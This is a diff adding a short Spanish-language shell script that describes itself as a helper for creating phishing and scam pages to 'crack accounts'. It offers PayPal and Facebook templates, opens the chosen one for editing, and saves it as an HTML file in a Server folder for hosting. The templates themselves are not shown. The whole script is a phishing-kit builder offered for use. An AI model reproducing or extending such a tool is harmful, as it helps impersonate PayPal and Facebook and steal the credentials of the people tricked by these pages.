@@ -1,0 +1,23 @@
+apt install nano
+sh .banner
+echo "Este programa te ayudara a crear"
+echo "tus phishings y scams para crackear"
+echo "cuentas...Solo sigue las instrucciones:"
+echo ""
+echo "#############"
+echo "1)PayPal----#"
+echo "2)Facebook--#"
+echo "#############"
+read input
+cp ..$input $input
+nano $input
+sh .banner
+echo "Introduce un nombre para tu scam:"
+read input1
+mv $input $input1.html
+mkdir Server
+mv $input1.html Server
+sh .banner
+echo "Desea crear otro scam?:"
+read input2
+sh PhishBuild.sh
